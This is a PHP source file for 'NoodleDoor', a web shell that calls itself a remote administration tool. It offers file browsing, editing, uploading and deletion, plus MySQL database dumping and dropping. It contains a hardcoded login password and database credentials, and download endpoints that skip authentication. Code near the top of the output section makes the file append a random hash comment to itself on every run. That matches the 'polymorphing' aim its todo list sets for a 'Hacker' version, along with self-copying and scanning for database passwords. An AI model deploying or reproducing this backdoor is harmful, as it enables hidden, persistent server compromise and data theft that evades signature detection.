<?php
$pass = hash("sha256", "cake");
$sqlinfo = [
  "host" => "localhost",
  "username" => "qafbuevv_zbee",
  "password" => "VO46kQSfLc7w"
];

/*
NoodleDoor made by Zbee (Ethan Henderson) 2014 - https://github.com/zbee/noodledoor
Todo:
- File System
  - Detect things that don't have to be archived before downloading
  - Change file permissions
- Command line
  - Execute commands
  - See output of commands
- Database
  - Search file system for password
    - Search for files named mysql
    - Search within files for mysql functions
  - View tables
  - View rows
  - Edit rows
  - Delete rows
  - Edit tables
  - Delete tables
  - Empty tables
  - Edit databases
  - Drop databases
  - Download tables
  - Execute SQL
- Overall
  - Different versions
    -Hacker
      - Polymorphing (add stuff to different locations in file)
      - Copy itself (select folder to have NoodleDoor placed into all subsequent folders)
      - Database password detection (scan file system to see if passwords to database can be found)
      - From email detection (scan file system to see what email is used to send emails from the system)
    - Admin
      -
*/

date_default_timezone_set('America/Denver');

function endsWith($a,$b){$c=strlen($b);$d=$c*-1;return(substr($a,$d)===$b);}
function startsWith($a,$b){$c=strlen($b);return(substr($a,0,$c)===$b);}
function emptyDir($a){if(is_dir($a)){$b=scandir($a);foreach($b as $c){if($c!="."&&$c!=".."){if(is_dir($a."/".$c))emptyDir($a."/".$c);else unlink($a."/".$c);}}reset($b);rmdir($a);}}
function dirsize($a){$b=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($a));$c = 0;foreach($b as $d){$c+=$d->getSize();}return $c;}
function getsize($a,$b=2){if(is_file($a)){$a=filesize($a);}elseif(is_dir($a)){$a=dirsize($a);}return$a;}
function hsize($a,$b=2){$a=getsize($a);$c=array('b','kb','mb','gb','tb','pb','eb','zb','yb');$d=floor((strlen($a)-1)/3);return sprintf("%.{$b}f",$a/pow(1024,$d)).@$c[$d];}
function hperms($a){$b=fileperms($a);if(($b&0xC000)==0xC000){$c='s';}elseif(($b&0xA000)==0xA000){$c='l';}elseif(($b&0x8000)==0x8000){$c='-';}elseif(($b&0x6000)==0x6000){$c='b';}elseif(($b&0x4000)==0x4000){$c='d';}elseif(($b&0x2000)==0x2000){$c='c';}elseif(($b&0x1000)==0x1000){$c='p';}else{$c='u';}$c.=(($b&0x0100)?'r':'-');$c.=(($b&0x0080)?'w':'-');$c.=(($b&0x0040)?(($b&0x0800)?'s':'x'):(($b&0x0800)?'S':'-'));$c.=(($b&0x0020)?'r':'-');$c.=(($b&0x0010)?'w':'-');$c.=(($b&0x0008)?(($b&0x0400)?'s':'x'):(($b&0x0400)?'S':'-'));$c.=(($b&0x0004)?'r':'-');$c.=(($b&0x0002)?'w':'-');$c.=(($b&0x0001)?(($b&0x0200)?'t':'x'):(($b&0x0200)?'T':'-'));return $c;}
function hpath(){global $pass;global $path;$a=array_filter(explode("/",$path));$b="";$c="";foreach($a as $d){$b.="/".$d;$c.="<li><a p='$pass' dir='$b' class='a'>$d</a></li>";}return "<ol class='breadcrumb'>$c<a href='?dl=$path' target='_blank' class='btn btn-xs btn-default pull-right'><i class='glyphicon glyphicon-download' aria-hidden='true'></i> Download Folder</a><form id='file' action='' method='post' enctype='multipart/form-data' class='form form-inline pull-right'><input type='hidden' name='action' value='upload'><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><span class='btn btn-xs btn-default btn-file'><i class='glyphicon glyphicon-upload' aria-hidden='true'></i> Upload File<input type='file' name='file'></span><input type='submit' style='display:none;'></form><button type='button' class='btn btn-default btn-xs pull-right' data-toggle='modal' data-target='#modNew'><i class='glyphicon glyphicon-plus'></i> Create File</button></ol><div class='modal fade' id='modNew' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'><span aria-hidden='true'>&times;</span><span class='sr-only'>Close</span></button><h4 class='modal-title' id='myModalLabel'>Create a new File</h4></div><form action='' method='post' class='form'><div class='modal-body'><div class='form-group'><label for='newname'>Name of File</label><input type='text' id='newname' class='form-control' name='target'></div><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='create'></div><div class='modal-footer'><button type='button' class='btn btn-default' data-dismiss='modal'>Close</button><input type='submit' value='Create' class='btn btn-default'></div></form></div></div></div>";}
function relPath($a,$b=__FILE__){if($a == $b){return "./";}$b=is_dir($b)?rtrim($b,'\/').'/':$b;$a=is_dir($a)?rtrim($a,'\/').'/':$a;$b=str_replace('\\','/',$b);$a=str_replace('\\','/',$a);$b=explode('/',$b);$a=explode('/',$a);$c=$a;foreach($b as $d=>$e){if($e===$a[$d]){array_shift($c);}else{$f=count($b)-$d;if($f>1){$g=(count($c)+$f-1)*-1;$c=array_pad($c,$g,'..');break;}else{$c[0]='./'.$c[0];}}}return implode('/',$c);}
function _download($a,$b){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Length: '.getsize($a));header('Content-Disposition: attachment; filename='.basename($b));readfile(str_replace("/","",$a));}
function dlDir($d){try {$j=md5(str_replace("/", "", $d)) . ".tar";$a=new PharData($j);$a->buildFromDirectory(relPath($d));}catch(Exception $e){echo $e;}_download($j, $j);unlink($j);}
function dlFile($d){try {$j=md5(str_replace("/", "", $d)) . ".tar";$a=new PharData($j);$a->addFile(relPath($d));}catch(Exception $e){echo $e;}_download($j, $j);unlink($j);}
Class DBBackup{private $a;private $b;private $c;private $d;private $f;private $g;private $h=array();private $j;private $k=array();private $l;private $m;public function DBBackup($n){if(!$n['host'])$this->error[]='Parameter host missing';if(!$n['user'])$this->error[]='Parameter user missing';if(!isset($n['password']))$this->error[]='Parameter password missing';if(!$n['database'])$this->error[]='Parameter database missing';if(!$n['driver'])$this->error[]='Parameter driver missing';if(count($this->error)>0){return;}$this->host=$n['host'];$this->driver=$n['driver'];$this->user=$n['user'];$this->password=$n['password'];$this->dbName=$n['database'];$this->fileName=$this->dbName."-".time().".sql";$this->writeFile('CREATE DATABASE '.$this->dbName.";\n\n");if($this->host=='localhost'){$this->host='127.0.0.1';}$this->dsn=$this->driver.':host='.$this->host.';dbname='.$this->dbName;$this->connect();$this->getTables();$this->writeFile("-- THE END\n\n");_download($this->fileName, $this->fileName);unlink($this->fileName);}public function writeFile($p){file_put_contents($this->fileName,(is_file($this->fileName)==false?"":file_get_contents($this->fileName)).$p);}public function backup(){if(count($this->error)>0){return array('error'=>true,'msg'=>$this->error);}return array('error'=>false,'msg'=>$this->final);}private function generate($r){$this->final.='--CREATING TABLE '.$r['name']."\n";$this->final.=$r['create'].";\n\n";$this->final.='--INSERTING DATA INTO '.$r['name']."\n";$this->final.=$r['data']."\n\n\n";$this->writeFile($this->final);$this->final="";}private function connect(){try{$this->handler=new PDO($this->dsn,$this->user,$this->password);}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}private function getTables(){try{$t=$this->handler->query('SHOW TABLES');$u=$t->fetchAll();$v=0;foreach($u as $w){$x['name']=$w[0];$x['create']=$this->getColumns($w[0]);$x['data']=$this->getData($w[0]);$this->generate($x);$v++;}unset($t);unset($u);unset($v);return true;}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}private function getColumns($y){try{$t=$this->handler->query('SHOW CREATE TABLE '.$y);$z=$t->fetchAll();$z[0][1]=preg_replace("/AUTO_INCREMENT=[\w]*./",'',$z[0][1]);return $z[0][1];}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}private function getData($y){try{$t=$this->handler->query('SELECT * FROM '.$y);$z=$t->fetchAll(PDO::FETCH_NUM);$aa='';foreach($z as $bb){foreach($bb as&$cc){$cc=htmlentities(addslashes($cc));}$aa.='INSERT INTO '.$y.' VALUES (\''.implode('\',\'',$bb).'\');'."\n";}return $aa;}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}}
function dlDB($h,$u,$p,$d){$b=new DBBackup(array('host'=>$h,'driver'=>'mysql','user'=>$u,'password'=>$p,'database'=>$d));}

if (isset($_GET["dl"])) {
  if (is_file($_GET["dl"])) {
    dlFile($_GET["dl"]);
  } elseif (is_dir($_GET["dl"])) {
    dlDir($_GET["dl"]);
  }
  exit;
}

if (isset($_GET["d"]) && isset($_GET["h"]) && isset($_GET["u"]) && isset($_GET["p"])) {
  dlDB($_GET["h"],$_GET["u"],$_GET["p"],$_GET["d"]);
  exit;
}

if (hash("sha256", $_POST['p']) == $pass || $_POST['p'] == $pass) {
  $nof = explode("/", __FILE__)[count(explode("/", __FILE__))-1];
  $path = isset($_POST['dir']) ? $_POST['dir'] : __FILE__;
  $path = endsWith($path, $nof) && strlen($path) == strlen(__FILE__) ? substr($path, 0, (-1 * strlen($nof))) : $path;
  $path = startsWith($path, "/") ? $path : "/" . $path;
  $path = endsWith($path, "/") ? $path : $path . "/";
  $path = endsWith($path, "../") ? substr($path, 0, (-1 * (strlen(explode("/", $path)[count(explode("/", $path))-3]) + 4))) : $path;
  $bod = "";

  if (isset($_GET["c"])) {
	  $bod .= "";
  } elseif (isset($_GET["d"])) {
    if (isset($_POST["d-p"])) {
      try {
        $db = new PDO("mysql:host=".$_POST["d-h"].";charset=utf8", $_POST["d-u"], $_POST["d-p"]);
      } catch (PDOException $e) {
        $err = "<div class='alert alert-danger'>ERROR: " . $e->getMessage() . "</div>";
      }
    } else {
      $db = null;
      $err = "";
    }

    if ($db == null) {
      $bod .= "
      <div class='col-xs-offset-0 col-xs-12 col-md-offset-4 col-md-4'>
        <form class='form' role='form' method='post'>
          ".$err."
          <input type='hidden' name='p' value='$pass'>
          <input type='hidden' name='action' value='login'>
          <input type='hidden' name='target' value='databases'>
          <div class='form-group'>
            <label for='u'>SQL Host</label>
            <input type='text' class='form-control' id='u' name='d-h' placeholder='Host' value='".$sqlinfo["host"]."'>
          </div>
          <div class='form-group'>
            <label for='u'>SQL Username</label>
            <input type='text' class='form-control' id='u' name='d-u' placeholder='Username' value='".$sqlinfo["username"]."'>
          </div>
          <div class='form-group'>
            <label for='p'>SQL Password</label>
            <input type='password' class='form-control' id='p' name='d-p' placeholder='Password' value='".$sqlinfo["password"]."'>
          </div>
          <button type='submit' class='btn btn-default btn-block'>Sign in</button>
        </form>
      </div>";
    } elseif (is_object($db) && $err == null && $_POST["target"] == "databases") {
      $bod .= "<table class='col-xs-12 table table-bordered table-condensed table-responsive table-striped'><tr><th>Database</th><th>Collation</th><th>Tables</th><th></th></tr>";
      $stmt = $db->query("show databases");
      foreach ($db->query("SHOW GRANTS FOR CURRENT_USER()") as $t) {
        $p = $t[0];
        $p = explode("GRANT ", $p)[1];
        $p = explode(" TO", $p)[0];
        $p = explode(" ON ", $p);
        #echo $p[0], $p[1];
        #echo "<Br><br>";
      }
      foreach($stmt as $row) {
        $rows = 0;
        $rowsq = $db->query("select count(*) from `information_schema`.tables where table_schema='".$row["Database"]."'");
        foreach($rowsq as $r) {
          $rows = intval($r[0]);
        }
        $col = "";
        $colq = $db->query("SELECT CCSA.character_set_name FROM information_schema.`TABLES` T,
          information_schema.`COLLATION_CHARACTER_SET_APPLICABILITY` CCSA
          WHERE CCSA.collation_name = T.table_collation
          AND T.table_schema = '".$row["Database"]."'");
        foreach($colq as $c) {
          $col = $c[0];
        }
        $dl = "<a href='?d=".$row["Database"]."&h=".$_POST["d-h"]."&u=".$_POST["d-u"]."&p=". $_POST["d-p"]."' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
        $delete = "<a target='database' dir='".$row["Database"]."' action='drop' class='a btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
        $bod .= "<tr><td><a class='a' target='database' dir='".$row["Database"]."' action='view'><i class='glyphicon glyphicon-briefcase'></i> ".$row["Database"]."</a></td><td>".$col."</td><td>$rows</td><td>$delete $dl</td></tr>";
      }
    }
  } else {
	  $bod .= hpath();
	  $action = isset($_POST["action"]) ? ($_POST["action"] == "browse" ? "browse" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "delete" ? "delete" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "rename" ? "rename" : ($_POST["action"] == "upload" ? "upload" : ($_POST["action"] == "create" ? "create" : "browse"))))))) : "browse";
	  if ($action == "delete") {
      if ($_POST["target"] != __FILE__ && !startsWith(__FILE__, $_POST["target"])) {
        if (is_file($_POST["target"])) {
          unlink($_POST["target"]);
        } elseif (is_dir($_POST["target"])) {
          emptyDir($_POST["target"]);
        }
      }
      $action = "browse";
	  } elseif ($action == "create") {
      if (!is_file($_POST["target"])) {
        file_put_contents($_POST["dir"].$_POST["target"], "");
      }
      $action = "browse";
	  } elseif ($action == "rename") {
      if ($_POST["target"] != __FILE__ && !startsWith(__FILE__, $_POST["target"])) {
        rename($_POST["target"], $_POST["dir"].$_POST["change"]);
        $action = "browse";
      }
      $action = "browse";
	  } elseif ($action == "upload") {
      $target_file = $path . basename($_FILES["file"]["name"]);
      $uploadOk = 1;
      $uploadOk = 1;
      if (file_exists($target_file)) {
        echo "File already exists.";
        $uploadOk = 0;
      }
      if ($uploadOk == 0) {
        echo "Your file was not uploaded.";
      } else {
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {

        } else {
          echo "There was an error uploading your file.";
        }
      }
      $action = "browse";
    } elseif ($action == "edit" && strlen($_POST['new']) < 4) {
      $file = explode("/", $_POST["target"])[count(explode("/", $_POST["target"]))-1];
      $bod .= "Editing <strong>$file</strong><br><br><form method='post' action=''><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='edit'><input type='hidden' name='target' value='$_POST[target]'><textarea name='new' style='width:95%' rows='20'>" . htmlentities(file_get_contents($_POST["target"])) . "</textarea><br><input type='submit' value='Save' class='btn btn-primary'></form>";
	  } elseif ($action == "edit" && strlen($_POST['new']) > 4) {
      $file = explode("/", $_POST["target"])[count(explode("/", $_POST["target"]))-1];
      file_put_contents($_POST["target"], $_POST['new']);
      $bod .= "Editing <strong>$file</strong><br><br>File saved!<br><form method='post' action=''><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='edit'><input type='hidden' name='target' value='$_POST[target]'><textarea name='new' style='width:95%' rows='20'>" . htmlentities(file_get_contents($_POST["target"])) . "</textarea><br><input type='submit' value='Save' class='btn btn-primary'></form>";
	  }
	  if ($action == "browse") {
      $dir = scandir($path);
      $bod .= "<table class='col-xs-12 table table-bordered table-condensed table-responsive table-striped'><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Owner</th><th>Date Modified</th><th></th></tr>";
      $dirs = "";
      $files = "";
      foreach ($dir as $file) {
        $sfile = preg_replace("/[^a-zA-Z0-9]+/", "", $file);
        if ($file == ".") { continue; }
        if (is_dir($path . $file)) {
          $stats = [];
          $stats["name"] = "<a p='$pass' dir='$path$file' class='a'><i class='glyphicon glyphicon-folder-open'></i> /$file</a>";
          $stats["perms"] = "";
          $stats["owner"] = "";
          $stats["size"] = $file != ".." ? hsize($path . $file) : "";
          $chsums = "";
          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
          $isdir = true;
        } elseif (is_file($path . $file)) {
          $stats = stat($path . $file);
          $stats["name"] = "<a p='$pass' dir='$path' action='edit' target='$path$file' class='a'><i class='glyphicon glyphicon-file'></i> $file</a>";
          $stats["perms"] = hperms($path . $file);
          $stats["owner"] = posix_getpwuid(fileowner($path . $file))["name"];
          $stats["size"] = hsize($path . $file);
          $hashes = "";
          foreach (hash_algos() as $v) {
            $r = getsize($path . $file) < 1980000000 ? hash_file($v, $path . $file) : "<a href='http://php.net/manual/en/function.hash-file.php#103656'>file too large</a>";
            $stats["hashes"][$v] = $r;
            $sr = strlen($r) > 55 ? substr($r, 0, 52) . "..." : $r;
            $hashes .= "<tr><td>$v</td><td><span title='$r'>$sr</span></td></tr>";
          }
          $chsums = "<button type='button' class='btn btn-default btn-xs' data-toggle='modal' data-target='#mod$sfile'><i class='glyphicon glyphicon-lock'></i></button><div class='modal fade' id='mod$sfile' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'><span aria-hidden='true'>&times;</span><span class='sr-only'>Close</span></button><h4 class='modal-title' id='myModalLabel'>$file Checksums</h4></div><div class='modal-body'><table class='table table-responsive table-striped table-bordered hashes'>".$hashes."</table></div><div class='modal-footer'><button type='button' class='btn btn-default' data-dismiss='modal'>Close</button></div></div></div></div>";
          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger a'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
          $isdir = false;
        }
        $stats["name"] = $file != ".." && $file != $nof ? "<button type='button' onClick='$(\"#s$sfile\").toggle();$(\"#f$sfile\").toggle();' class='btn btn-default btn-xs pull-right'><i class='glyphicon glyphicon-pencil'></i></button><span id='s$sfile'>" . $stats["name"] . "</span><form id='f$sfile' action='' method='post' style='display:none' class='form form-inline'><input type='text' name='change' value='$file' class='form-control input-sm'><input type='hidden' name='p' value='$pass'><input type='hidden' name='target' value='$path$file'><input type='hidden' name='action' value='rename'><input type='hidden' name='dir' value='$path'><input type='submit' style='display:none'></form>" : $stats["name"];
        $stats["date"] = date("Y-m-d, g:ma", filectime($path . $file));
        $download = "<a href='?dl=$path$file' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
        $echo = "<tr>
          <td>$stats[name]</td>
          <td>$stats[size]</td>
          <td>$stats[perms]</td>
          <td>$stats[owner]</td>
          <td>$stats[date]</td>
          <td>$delete $download $chsums</td>
        </tr>";
        if ($isdir) {
        $dirs .= $echo;
        } else {
        $files .= $echo;
        }
      }
      $bod .= $dirs;
      $bod .= $files;
	  }
  }
} else {
  $bod .= "
  <div class='col-xs-offset-0 col-xs-12 col-md-offset-4 col-md-4'>
    <form class='form-inline' role='form' method='post'>
      <div class='form-group'>
        <label class='sr-only' for='p'>Password</label>
        <input type='password' class='form-control' id='p' name='p' placeholder='Password'>
      </div>
      <button type='submit' class='btn btn-default'>Sign in</button>
    </form>
  </div>";
}

$rtext = hash("sha512", substr(str_shuffle(str_repeat("!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~",rand(15,50))),1,rand(256,4096)));
file_put_contents(__FILE__, file_get_contents(__FILE__) . "\n<!--$rtext-->");
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="A program for remote viewing the filesystem, database, and using the command line for system administrators away from home">
    <meta name="author" content="Zbee">

    <title>NoodleDoor</title>

    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" rel="stylesheet">
    <style>
    a { cursor:pointer; }
    body { margin-top: 75px; }
    .hashes { max-width: 300px !important; }
    .btn-file {
        position: relative;
        overflow: hidden;
      }
      .btn-file input[type=file] {
        position: absolute;
        top: 0;
        right: 0;
        min-width: 100%;
        min-height: 100%;
        font-size: 100px;
        text-align: right;
        filter: alpha(opacity=0);
        opacity: 0;
        outline: none;
        background: white;
        cursor: inherit;
        display: block;
      }
    </style>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body id="bod">

    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
      <div class="container container-fluid">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="<?=$nof?>">NoodleDoor</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li <? if (!isset($_GET["c"]) && !isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>">File System</a></li>
            <li <? if (isset($_GET["c"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?c">Command Line</a></li>
            <li <? if (isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?d">Database</a></li>
          </ul>
          <ul class="nav navbar-nav navbar-right">
            <li><a href="https://github.com/Zbee" target="_blank">Made by Zbee</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>

    <div class="container">
    <?=$bod?>
    </div><!-- /.container -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
    <script>
    $(".a").click(function () {
      $(".container").remove();
      $("body").load("./<?=$nof?>", {p: "<?=$pass?>", dir: $(this).attr("dir"), action: $(this).attr("action"), target: $(this).attr("target")});
    });
    $(".breadcrumb li:first-child").html($(".breadcrumb li:first-child a").html()).addClass("active");
    $("input:file").change(function (){
      $("#file").submit();
    });
    </script>
  </body>
</html>
<!--f5ac5a342612ddea162ce46e903862a9cd948492a0d1c35d58c7227f82fff0dde3bbfed98e54511ceb46590fcfbcbbba0b7c103785e19983c1689225f69bb837-->
<!--4b4af191056a6baee0cbe933e6495bb5947897217fdbfa0ca7a76435efd3b47ef06a0198e062f854d47242629803b72a616d9abb62c715b1c61583cc4c806b6e-->
<!--3b7c889cbfd17814118552f06214d0597f699bbc6c5b4cd7ebc099f39f1bfdd2a25795b24098f29ec2e5a50ec52689cde40d054eb1dabd704e0441246a3c1cbb-->
<!--ebb32e7302a347fc5a8d5c18d9781f8b0a4094dd6e29feb4e638f8d110c8c6858785823ad571c485ed36ffad52c9a561315324e3b4369c0fc110a6cdc99491ac-->
<!--53af8954575844447d577c098c1e663f417f0dcf6e14d960f9c86dd7ac46fddd0ad12d4986b3b85950ceb9c283652c33b4dc9dd06e2c39343a5a869546ca01f8-->
<!--9b1d41e83b24575c51d2cb45cd9d18a7f7508dffaafa73a7b4f6b03e47db77d924ad051f761127e92dafc9ce15c2572017ff07d02846c96788480c76c9cdeaf2-->
<!--0579e35bec69aa5649c029a2e5584c973163535482b9d66eb1f2415f674ee2ab597b63a6b26243ce4f30fbd3e9cdd0ee83414b705e83470326bb0971e1e18c7b-->
<!--7732c3c3b3d5e1e32bdaf0db8fa9868c7f6e28d642f59504756db7b4a66eecd0ddb9d68be0686d6a384077b1614e81a28c0b601648a4b9684874bbec5266b5b4-->
<!--1dbc44e98169897e0d7120461882c58b8ca6a2762a0f8efb55acb2200fc1e461d05dd625cea9171edc3f9757cd991416e94ba943dcb93a551a22f422245e5b91-->
<!--d8a91935e49cbb6e2865d3e23c442e2a3107a6c9f8778dfbe5f53088eb09e406c3218970bc7db552e3825a80cf52773ebddcd31c5053cd89a0d7fb2d7fee2f63-->
<!--ff6513a7e755c10c97e04511f80066b6e25ab8c4dcb5dc7c11e95f00250e1f59c5390ede4585133d5a1991f16bef999f482b63e89c7b7d0097fe32fc684fb0f8-->
<!--86d820ad2634e7fccbde59fdedb39717a14d65c7a41d7c7d8f89bff08a9c19dfd5eb46cd1beae8f97b22835aecf015e6a6bf7b14a1fb374ee713e000629a75c1-->
<!--7957c9bdf68475b33359f548ae971e122114c22834977e4252f5e468eea79d3b7cad5c594c26e8eee281a852d9319b052b13ba7fe55fe9d924ba21bcde91f6a2-->
<!--1669b022e80ff92daf84a1be1bc8c08774690a57455af9673b145de8f119a66370e8cda2c23d3c1c196cbbd0cf2469f7e6edd7b00674ec312cfaa04f0ceafa4f-->
<!--27042cd204ba7f58d08e2222935038ad5b60d10790a12062a49d4ae65291ed91873ea69f48b35d995ba840197c9cc559fd6649cc6e9ab581c267485f59b68f0c-->
<!--9e582213762e205954921f2fa6ddaefadca170fe387ec706412e0ff073efdebdb0b7195e8b60bbe33f960ea162ef44e9c1288d8f13cb93a89f8875284b44b002-->
<!--f322fc3e5db007179c34bfa003741f96fbb67f766f1586dfdf08c44dde6a12aaea3b1f619fab33f0e82439b7520476c7720c1f6aa524f13e790d10e296302963-->
<!--0717833d3f12e6e487b82598c47057cfd315431531b4515132cfb156e94b6ca8b38bf8c7d524c187f93e6e18005382f7e0322010c66f2a6de5b184a29992bcf1-->
<!--733d3407762afa112c19d2cede5ff571873a35082d07b4a3dfcdca671b27a9727df91f5af202862344f38d64b3f05a900b912dd753b196ce1b92948e922be967-->
<!--4ba21a0ee239b6a3f2c26fedbfb831b0721e356d664fd3bd9a1e1fb20dd78a03c697f141f31216b9e92f66c1fe9d906f98d60e03926d269131209d7627d50951-->
<!--35ad363e350f8e035d85f2d947c0eaba62cb9374b623f5fb856b630beb23ac1ee6af1598d30edb585fbca4d987eb8f8d24230ade4eac2c2bea2e2ef1b8a4a126-->
<!--2ae399a225b32ef4c16fb910711f36d4dce64f0d6a769b88790e02ce470cd16adb6bde38f07c44a111e1caba9f2f8655803b2e2a5bb653b847c5619e9acdd741-->
<!--efa0ad81422e9c3d5b770e3972a96c29386d40fe0fc0065336754569964c28aecc5c434b4956679378e081a6484ed040177e570a9cbed7330b3a87ae6c0260b7-->
<!--306741a820be36d6050da791f38f5660e2d654c75d479658b704504123cf496334f97041690865c54caf1f76219ef6884a6f4bc9b38bffb006378d4da7db8911-->
<!--73c4b80a6de8a3a95a0a21b1fbdc5c0a02f8da609413b7cadecf09b1381e1dabb4ae0f636f130c09b20996ec7ea2189d938559a6b3dad8ba4e5d7c9c2b3f53b2-->
<!--344c3a4c7c28a4243e94f93b88162fedde1b1f5b2c04158868f2cf8328be7c6c74977c7cc947e663f1431d0552825ec7e028d46d5add70c9e139f03259da1770-->
<!--0847e3ff1f14ba98b333c9bfc085328be88094b8767792e059b5eaabad746b8954215480a77ed994d060639d10166950ad353bb3b83c8061597157f9a7b87e12-->
<!--e7b8f23a73a6da9937a28370cb7300bdd7bd95fe815d24b3bcd81de768b5c47341636ba0d4d0841d4f6e9334169f42658a7dfffc05e789cbea19a3b8d7ec9437-->
<!--65372d59dc57fc0f3009ec0db2aefac2354fb4b80cbe6c51a4118d4bca5889deff347c271200c54b535887c4f783c0ca39a87876e5cd5c0f2890dd373d68d894-->
<!--a8712eab15bee46ad3cd8c80d867300a5ed4c67017639f3810f9d2252c9b632c98b989c46d64f1e08983fe4589c331b1dc3133ff0e01af0254c833750f669472-->
<!--f5b0e6cab89ccb032125b479efdc9034d605882ce7a137d37281baaf95b71e71076f36eec10589a17037026c58dfa0654db728bc1606cc7e0070a582c37b0bcf-->
<!--52c2b5293b74ae20610119ee15d41e3d6d1e4f2fd685fe3fdc0369beebc07a4aacde605f4e5eea340f180ef2b8f8eb3e91d080e9652a8b3c184ec416ca54554b-->
<!--671aaa9b4651fde5f34ab5ab761381974bd59979a02ba99b796809455339ee6ed526412b11b29badd977ae03a2e7cd5eb66fea67e2eec3a3e0901d2f0361c8f6-->
<!--214d75c29c1a0e975ffbd143dbed8e24b430a79e8884183f61154fba8e587d86d15194252e26d26bd0bd957dc81d505ff6f9ac61c226d1fcaa761c59cbbe0026-->
<!--14ad3db52e7c4c51f18cf3b40afc4e7f0f33fee1d3e2666ef08e871c5adbdd3d42979a2d1c0838bcabca35f8e82c4366b91041d1caaf178835560a5b7ccf3fed-->
<!--8ba12891bd95999504d5f1e40b141d18f3a0a82d9bf40a04587e05ec5d260ba196ded04c0ddc36bbab63e8abd0951587089dc5793746ca9b272c2a7b3406b0b7-->
<!--f05263cc639b7289ce51fb3a20b3651f048e50f2cf8f92b6d55d0c851a4feef155088f6904cc65aeca1ab88ddf6f9181786651aab90a23badd0cb47030772826-->
<!--2a51fb3577d832881439102e06ab0e1c42779a1dfde27a7a05ef22f2ce9907b8b70c4f2224bdfef229fd45abd815a0ac860011b93d390b201e941df68e38a2b2-->
<!--c4a32b2926fce626170297f686f90318d6a1aedad2f49a40b1b21339aff392ee86f17463995495c4830eedf765ec431e111b8ee53e14d412e21af18ef47afa54-->
<!--50efeee036be4726cb042747367c42be0f8393964c03cf9feb0c53aa4b46ba20d8d04ff513f4d64e30a7a39c64cf901ab59d6f13e54fbf23f00a8227fe8f5029-->
<!--9fd5b1ba85cc2de60b3c17536b06a4bfbeffbe37bb41e0aab2402ebf7178502864abd569bf169e1e8f78ff4f4282274ea0edbc874bdf13ae956f025f1fa3aae8-->
<!--d9688955574ffe194b7ea8fc4d526344a03bea2d69bae231a3a0f23e03be64c036319bec386f1ad78cd43507a27a7f54ddc284d270ef1c56afedabdf57e0510f-->
<!--e8c3185bd1f964a6b949ea2cdc2379aca39d51faeb9216165f0a644c313560fea7791e98a20784af4505a3bd65a3441a6b20c7ccee01933b8b25e0c766d88815-->
<!--eb2b5c8572981d0479dcb3f74bb9219e671a8d0df5f42b972189ab2d2a57618a5100626edd1b3c47d7949dceae790980fab52fefc4926863e46ba3551086a50a-->
